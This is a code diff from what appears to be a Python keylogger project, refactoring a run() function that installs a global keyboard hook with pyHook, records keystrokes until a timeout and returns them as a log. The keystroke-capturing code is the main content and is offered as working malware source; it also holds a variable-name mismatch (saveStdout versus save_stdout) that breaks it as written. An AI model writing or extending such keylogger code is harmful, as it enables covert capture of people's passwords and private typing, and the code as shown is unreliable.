@@ -60,22 +60,24 @@ class KeyLogger:
         
         return True
     
-    def run():
+#===========================#
     
-        saveStdout = sys.stdout
-        sys.stdout = StringIO()
-        
-        kl = KeyLogger()
-        hm = pyHook.HookManager()
-        hm.KeyDown = kl.keystroke
-        hm.HookKeyboard()
-        
-        while time.thread_time() < TIMEOUT:
-            pythoncom.PumpWaitingMessages()
-            
-        log = sys.stdout.getvalue()
-        sys.stdout = save_stdout
-        return log
+def run():
+
+    saveStdout = sys.stdout
+    sys.stdout = StringIO()
     
-    if __name__ == '__main__':
-        print(run())
+    kl = KeyLogger()
+    hm = pyHook.HookManager()
+    hm.KeyDown = kl.keystroke
+    hm.HookKeyboard()
+    
+    while time.thread_time() < TIMEOUT:
+        pythoncom.PumpWaitingMessages()
+        
+    log = sys.stdout.getvalue()
+    sys.stdout = save_stdout
+    return log
+
+if __name__ == '__main__':
+    print(run())
